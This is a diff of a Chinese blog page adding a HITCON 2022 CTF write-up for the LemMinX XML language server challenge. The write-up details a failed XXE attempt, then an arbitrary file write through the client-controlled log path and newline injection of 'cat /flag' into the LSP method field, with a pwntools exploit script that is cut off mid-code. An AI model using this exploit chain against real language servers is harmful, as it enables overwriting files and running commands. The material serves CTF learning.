@@ -17,18 +17,20 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办">
+    <meta name="description" content="2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办 🏆 赛事概况  比赛时间：2022 年 11 月 25 日 21:00 至 11 月 27 日 21:00 (UTC+7)  比赛形式：线上 Jeopardy（解题） 模式  赛事规模：共吸引了来自全球 95 个国家的 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2022 HITCON WriteUp">
 <meta property="og:url" content="https://suc2es2.github.io/2022/04/14/2022%20HITCON/index.html">
 <meta property="og:site_name" content="雾島风起時">
-<meta property="og:description" content="2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办">
+<meta property="og:description" content="2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办 🏆 赛事概况  比赛时间：2022 年 11 月 25 日 21:00 至 11 月 27 日 21:00 (UTC+7)  比赛形式：线上 Jeopardy（解题） 模式  赛事规模：共吸引了来自全球 95 个国家的 1">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034QyuXElXDrg5N7XTHxby.png">
 <meta property="article:published_time" content="2022-04-14T05:18:00.000Z">
-<meta property="article:modified_time" content="2026-06-15T09:34:22.345Z">
+<meta property="article:modified_time" content="2026-09-20T06:20:59.289Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/i/034QyuXElXDrg5N7XTHxby.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -146,7 +148,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-HITCON-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2022 HITCON WriteUp</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-HITCON-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2022 HITCON WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lemminx%EF%BC%88XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">lemminx（XXE 无回显绕过）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -157,7 +159,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">252</div>
+    <div class="sidebar-state-number">253</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -165,7 +167,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">189</div>
+    <div class="sidebar-state-number">193</div>
   </div>
 </div>
 <div class="sidebar-social" >
@@ -224,7 +226,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2022-04-14T05:18:00.000Z" itemprop="datePublished">2022-04-14</time>
-    <time style="display: none;" id="post-update-time">2026-06-15</time>
+    <time style="display: none;" id="post-update-time">2026-09-20</time>
   </span>
 </div>
 
@@ -234,7 +236,109 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
         <h1 id="2022-HITCON-WriteUp"><a href="#2022-HITCON-WriteUp" class="headerlink" title="2022 HITCON WriteUp"></a>2022 HITCON WriteUp</h1><p>HITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办</p>
+<p>🏆 赛事概况</p>
+<ul>
+<li><p>比赛时间：2022 年 11 月 25 日 21:00 至 11 月 27 日 21:00 (UTC+7)</p>
+</li>
+<li><p>比赛形式：线上 Jeopardy（解题） 模式</p>
+</li>
+<li><p>赛事规模：共吸引了来自全球 95 个国家的 1,243 支队伍参赛</p>
+</li>
+<li><p>题目设置：共 27 道挑战题，涵盖 Web、Pwn、Crypto、Reverse、Misc 等方向</p>
+</li>
+</ul>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="lemminx（XXE-无回显绕过）"><a href="#lemminx（XXE-无回显绕过）" class="headerlink" title="lemminx（XXE 无回显绕过）"></a>lemminx（XXE 无回显绕过）</h3><p><img src="https://pic1.imgdb.cn/i/034QyuXElXDrg5N7XTHxby.png" alt="pasted_1789738890342_mtle1c.png"></p>
+<p>题目描述：<code>Eclipse LemMinX XML Language Server，版本 0.19.1</code></p>
+<p>LemMinX 是 Eclipse 基金会开源的一个 XML 语言服务器。当你在 VSCode 中打开一个 .xml 文件时，编辑器需要知道：</p>
+<ul>
+<li><p>这段 XML 语法对不对？</p>
+</li>
+<li><p>光标放在某个标签上时，应该提示什么补全？</p>
+</li>
+<li><p>这个标签的定义在哪里？</p>
+</li>
+</ul>
+<p>这些功能不是 VSCode 自己实现的，而是 VSCode 通过 LSP 协议 向 LemMinX 这个 “后端服务” 请求的。LemMinX 接收请求，分析 XML，然后把结果返回给编辑器</p>
+<p>LemMinX 是一个网络服务，它通过标准输入&#x2F;输出或 TCP 接收 LSP 消息，解析 XML 文档，并返回诊断信息。它本身不面向最终用户，而是面向编辑器（客户端）</p>
+<p>LSP 的消息格式类似 HTTP，由 Header 和 Body 两部分组成，中间用 <code>\r\n\r\n</code> 分隔</p>
+<p>Header 部分：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>123\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/vscode-jsonrpc; charset=utf-8\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
 
+<p>Body 是一个标准的 JSON-RPC 2.0 消息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:1,&quot;method&quot;:&quot;initialize&quot;,&quot;params&quot;:&#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>连接服务后，第一件事是发送 <code>initialize</code> 请求，告诉服务器 “我是什么编辑器，我支持什么功能”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;challenge-xxx.sandbox.ctfhub.com&quot;</span></span><br><span class="line">PORT = <span class="number">38926</span></span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">init_msg = &#123;</span><br><span class="line">    <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;initialize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;processId&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;rootUri&quot;</span>: <span class="string">&quot;file:///tmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;capabilities&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body = json.dumps(init_msg, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode()</span><br><span class="line">header = <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n\r\n&quot;</span>.encode()</span><br><span class="line">io.send(header + body)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收响应</span></span><br><span class="line">response = io.recv(timeout=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(response.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;id&quot;: 1,</span><br><span class="line">  &quot;result&quot;: &#123;</span><br><span class="line">    &quot;capabilities&quot;: &#123;</span><br><span class="line">      &quot;textDocumentSync&quot;: 2,</span><br><span class="line">      &quot;hoverProvider&quot;: true,</span><br><span class="line">      &quot;completionProvider&quot;: &#123;</span><br><span class="line">        &quot;triggerCharacters&quot;: [&quot;.&quot;, &quot;:&quot;, &quot;&lt;&quot;, &quot;\&quot;&quot;, &quot;=&quot;, &quot;/&quot;, &quot;\\&quot;, &quot;?&quot;, &quot;&#x27;&quot;, &quot;&amp;&quot;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;definitionProvider&quot;: true,</span><br><span class="line">      &quot;referencesProvider&quot;: true,</span><br><span class="line">      &quot;documentLinkProvider&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;serverInfo&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;XML Language Server&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;0.19.1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>capabilities</code> 告诉客户端 “我能做什么”</p>
+</li>
+<li><p><code>textDocumentSync: 2</code> 表示支持增量文档同步（Full 是 1，Incremental 是 2）</p>
+</li>
+<li><p><code>completionProvider</code> 表示支持自动补全</p>
+</li>
+<li><p><code>serverInfo.version: &quot;0.19.1&quot;</code> 确认了版本号</p>
+</li>
+</ul>
+<p>初始化完成后，客户端需要发送 <code>initialized</code> 通知</p>
+<p><code>initialize</code> 是握手请求，服务端回复能力列表后，客户端再发 <code>initialized</code> 确认 “我收到了，你可以开始工作了”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">initialized_msg = &#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;initialized&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body = json.dumps(initialized_msg, separators=(&quot;,&quot;, &quot;:&quot;)).encode()</span><br><span class="line">header = f&quot;Content-Length: &#123;len(body)&#125;\r\n\r\n&quot;.encode()</span><br><span class="line">io.send(header + body)</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>textDocument/didOpen</code> 通知发送一个恶意的 XML 文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">didopen_msg = &#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;textDocument/didOpen&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">        &quot;textDocument&quot;: &#123;</span><br><span class="line">            &quot;uri&quot;: &quot;file:///tmp/test.xml&quot;,</span><br><span class="line">            &quot;languageId&quot;: &quot;xml&quot;,</span><br><span class="line">            &quot;version&quot;: 1,</span><br><span class="line">            &quot;text&quot;: &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">                    &lt;!DOCTYPE root [</span><br><span class="line">                    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">                    ]&gt;</span><br><span class="line">                    &lt;root&gt;&amp;xxe;&lt;/root&gt;&#x27;&#x27;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>diagnostics</code> 是空数组。没有报错，但也没有返回文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;textDocument/publishDiagnostics&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;uri&quot;: &quot;file:///tmp/test.xml&quot;,</span><br><span class="line">    &quot;diagnostics&quot;: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原因一：LemMinX 在 0.19.1 版本中已经默认禁用了外部实体的解析</p>
+<p>原因二：即使 XXE 成功读取了文件，LemMinX 也不会把解析结果返回给客户端。LemMinX 的工作方式是：解析 XML → 分析语法 → 返回诊断信息（比如 “第 3 行缺少闭合标签”）</p>
+<p>原因三：<code>publishDiagnostics</code> 返回的是语法层面的诊断（如缺少标签、属性值无效等），不会包含实体展开后的内容。即使 <code>/flag</code> 被读取了，你也不可能从诊断信息中看到它</p>
+<p>既然 XML 解析层面走不通，我们把注意力转向 LemMinX 的配置系统</p>
+<p>LSP 协议规定，客户端在 <code>initialize</code> 请求中可以通过 <code>initializationOptions</code> 字段传递配置参数。很多语言服务器会读取这个字段来调整自己的行为——比如设置日志路径、配置代码格式化规则、指定 Schema 文件位置等</p>
+<p>核心问题：LemMinX 的 <code>initializationOptions</code> 支持哪些配置？有没有可以写入任意文件的配置项？</p>
+<p>搜索 LemMinX 的配置文档，在 GitHub 上找到了 <code>docs/Configuration.md</code>。其中明确写明了 <code>initializationOptions</code> 的 JSON 格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;initializationOptions&quot;: &#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;xml&quot;: &#123;</span><br><span class="line">            &quot;trace&quot;: &#123; &quot;server&quot;: &quot;verbose&quot; &#125;,</span><br><span class="line">            &quot;catalogs&quot;: [],</span><br><span class="line">            &quot;logs&quot;: &#123;</span><br><span class="line">                &quot;client&quot;: true,</span><br><span class="line">                &quot;file&quot;: &quot;/home/.../lsp4xml.log&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;format&quot;: &#123; ... &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文档中明确说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file: Path to the file for log messages to be output.</span><br><span class="line">Only send &#x27;file&#x27; on initialization.</span><br></pre></td></tr></table></figure>
+
+<p>这意味着：</p>
+<ul>
+<li><p>客户端可以通过 <code>initializationOptions.settings.xml.logs.file</code> 指定日志文件的输出路径</p>
+</li>
+<li><p>服务器会将日志消息写入这个文件</p>
+</li>
+<li><p>路径完全由客户端控制</p>
+</li>
+</ul>
+<p>这是一个典型的任意文件写入漏洞的入口</p>
+<p>题目环境的启动方式通常是：容器启动时执行一个脚本（比如 <code>/tmp/run.sh</code>），这个脚本负责启动 LemMinX 服务</p>
+<p>如果我们能把 <code>/tmp/run.sh</code> 覆盖成执行 <code>cat /flag</code> 的脚本，那么下一次连接时，容器会重新执行这个脚本，flag 就会被输出</p>
+<p>分析 LemMinX 的日志输出逻辑。当客户端发送一个不存在的方法时，LSP4J 框架会输出一条错误日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unsupported notification method: &lt;method_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>&lt;method_name&gt;</code> 是客户端发送的 <code>method</code> 字段的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 发送一个不存在的 method</span><br><span class="line">bad_msg = &#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;/printflag&quot;,  # 不存在的方法</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body = json.dumps(bad_msg, separators=(&quot;,&quot;, &quot;:&quot;)).encode()</span><br><span class="line">header = f&quot;Content-Length: &#123;len(body)&#125;\r\n\r\n&quot;.encode()</span><br><span class="line">io.send(header + body)</span><br></pre></td></tr></table></figure>
+
+<p>服务端日志中会出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unsupported notification method: /printflag</span><br></pre></td></tr></table></figure>
+
+<p>所以 <code>method</code> 字段的内容会原样进入日志，我们想要日志中包含 <code>cat /flag</code>。最直接的想法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bad_msg = &#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;cat /flag&quot;,  # 直接作为 method</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>日志会变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unsupported notification method: cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>但 <code>Unsupported notification method:</code> 和 <code>cat /flag</code> 在同一行，如果直接作为 shell 脚本执行，shell 会尝试执行一个叫做 <code>Unsupported</code> 的命令，而不是 <code>cat</code></p>
+<p>解决方案很简单：在 <code>method</code> 字段中注入换行符，让 <code>cat /flag</code> 成为一个独立的新行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bad_msg = &#123;</span><br><span class="line">    &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;\ncat /flag\n&quot;,  # 前后加换行</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击链路总览</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">第一次连接（植入阶段）</span><br><span class="line">    │</span><br><span class="line">    ├── 1. initialize 请求</span><br><span class="line">    │        │</span><br><span class="line">    │        └── initializationOptions.settings.xml.logs.file = &quot;/tmp/run.sh&quot;</span><br><span class="line">    │</span><br><span class="line">    ├── 2. initialized 通知</span><br><span class="line">    │</span><br><span class="line">    └── 3. 发送恶意 method 污染日志</span><br><span class="line">             │</span><br><span class="line">             └── method = &quot;\ncat /flag\n&quot;</span><br><span class="line">                      │</span><br><span class="line">                      ▼</span><br><span class="line">             日志写入 /tmp/run.sh</span><br><span class="line">             │</span><br><span class="line">             ▼</span><br><span class="line">第二次连接（触发阶段）</span><br><span class="line">    │</span><br><span class="line">    └── 容器重新执行 /tmp/run.sh</span><br><span class="line">             │</span><br><span class="line">             ▼</span><br><span class="line">        输出 flag&#123;...&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置 ==========</span></span><br><span class="line">HOST = <span class="string">&quot;challenge-xxx.sandbox.ctfhub.com&quot;</span></span><br><span class="line">PORT = <span class="number">38926</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_lsp</span>(<span class="params">io, obj</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送一条 LSP 消息（Header + JSON-RPC Body）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        io:  pwn 的 remote 对象</span></span><br><span class="line"><span class="string">        obj: 要发送的 JSON-RPC 对象（dict）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 将 dict 序列化为紧凑 JSON（无多余空格）</span></span><br><span class="line">    body = json.dumps(obj, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造 LSP Header（Content-Length 必须精确）</span></span><br><span class="line">    header = <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n\r\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送完整消息</span></span><br><span class="line">    io.send(header + body)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1_write_payload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一次连接：植入 payload</span></span><br><span class="line"><span class="string">    目标：将 /tmp/run.sh 覆盖为包含 &quot;cat /flag&quot; 的脚本</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Phase 1: 植入 payload...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ── 步骤 1: initialize 请求 ──</span></span><br><span class="line">    <span class="comment"># 关键：在 initializationOptions 中设置日志文件路径</span></span><br><span class="line">    send_lsp(io, &#123;</span><br><span class="line">        <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;initialize&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;processId&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;rootUri&quot;</span>: <span class="string">&quot;file:///tmp&quot;</span>,</span><br><span class="line">            <span class="string">&quot;capabilities&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;initializationOptions&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;xml&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;logs&quot;</span>: &#123;</span><br><span class="line">                            <span class="comment"># ★ 控制日志输出路径为 run.sh</span></span><br><span class="line">                            <span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/run.sh&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待服务器处理 initialize 请求</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ── 步骤 2: initialized 通知 ──</span></span><br><span class="line">    <span class="comment"># 这是 LSP 协议规定的流程，通知服务器初始化完成</span></span><br><span class="line">    send_lsp(io, &#123;</span><br><span class="line">        